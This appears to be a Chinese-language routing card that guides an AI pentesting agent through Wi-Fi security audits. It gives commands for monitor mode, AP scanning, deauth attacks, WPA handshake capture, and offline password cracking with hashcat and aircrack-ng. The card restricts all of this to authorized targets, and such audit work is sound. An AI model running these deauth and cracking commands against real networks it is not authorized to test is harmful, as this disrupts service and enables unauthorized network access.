---
name: 无线
description: >-
  Wi-Fi / 无线审计路由卡。触发：WPA、握手包、rogue AP、无线安全。
  网站案默认降权。全文 CSS 11。禁止对未授权频谱做攻击性测试。
---

# Wi-Fi / 无线（路由卡）

## 本仓探针

```bash
python3 炼蛊房/wireless_surface_probe.py pcap --path <抓包> --case <案>
```

L2=解析到 beacon；不发 deauth。证据进案卷 `测绘/`。

## 何时用

- 授权 AP / 频谱的无线安全审计
- WPA/WPA2/WPA3 握手包捕获与离线破解
- Rogue AP / Evil Twin 检测
- 用户点名无线渗透测试

网站案、业务 URL 默认不走本卡。

## 真源

- 全文：`智道藏书/三十九门/11-无线/MODULE.md`
- CSS 11：`python3 炼蛊房/css_query.py get --id 11-001`

## 核心步骤

1. **网卡准备**：确认支持监听模式。
   ```bash
   # 检查无线网卡
   iw dev
   # 启用监听模式
   sudo airmon-ng start wlan0
   # 确认 monitor 模式
   iwconfig wlan0mon
   ```

2. **AP 扫描与目标锁定**：发现授权范围内的 AP。
   ```bash
   # 扫描周围 AP
   sudo airodump-ng wlan0mon
   # 锁定目标频道抓包
   sudo airodump-ng -c <CH> --bssid <BSSID> -w capture wlan0mon
   ```

3. **握手包捕获**：WPA 四次握手。
   ```bash
   # 发送 deauth 触发重连（仅授权 AP）
   sudo aireplay-ng -0 5 -a <BSSID> wlan0mon
   # 确认 capture-01.cap 包含 WPA handshake
   aircrack-ng capture-01.cap
   ```

4. **离线破解**：
   ```bash
   # hashcat（GPU 加速）
   hcxpcapngtool -o hash.hc22000 capture-01.cap
   hashcat -m 22000 hash.hc22000 /path/to/wordlist.txt
   # 或 aircrack-ng + 字典
   aircrack-ng -w /path/to/wordlist.txt capture-01.cap
   ```

5. **WPA3/802.1X 评估**（如适用）：
   ```bash
   # EAP 类型探测
   eaphammer --cert-wizard
   # WPA3 SAE 降级检测
   wacker --wordlist /path/to/wordlist.txt --ssid <SSID> --interface wlan0mon
   ```

## 成功口径

| 级别 | 口径 |
|------|------|
| L1 | 完成 AP 枚举，识别加密类型与安全配置 |
| L2 | 捕获有效 WPA 握手包并完成离线破解 |
| L3 | 接入内网后发现可利用的内部资产（交接后续卡） |

## 分流

| 场景 | 去向 |
|------|------|
| BLE / Classic 蓝牙 / KNOB / GATT | `wireless-security`（蓝牙段） |
| Zigbee / Z-Wave / Thread / Matter | `wireless-security`（802.15.4 段） |
| LoRaWAN / sub-GHz / KeeLoq / TPMS | `radio-sdr` + `wireless-security` |
| WPA3-SAE Dragonblood / WPS Pixie / Evil-Twin | `wireless-security`（全文） |
| SDR / RF 非 Wi-Fi 信号 | `radio-sdr` |
| 接入内网后扫描 | `internal-tunnel` / `ad-windows-router` |
| 固件无线栈漏洞 | `firmware-pentest` |
| 硬件 AP 拆解 | `hardware-security` |
| Rogue AP 社工面 | `autonomous-social-engagement` |
| 未授权频谱 / 邻家 AP | **禁止** |

## 不要做

- 对未授权 AP 做 deauth / 握手捕获
- 干扰非目标频段
- 网站案中当主链使用
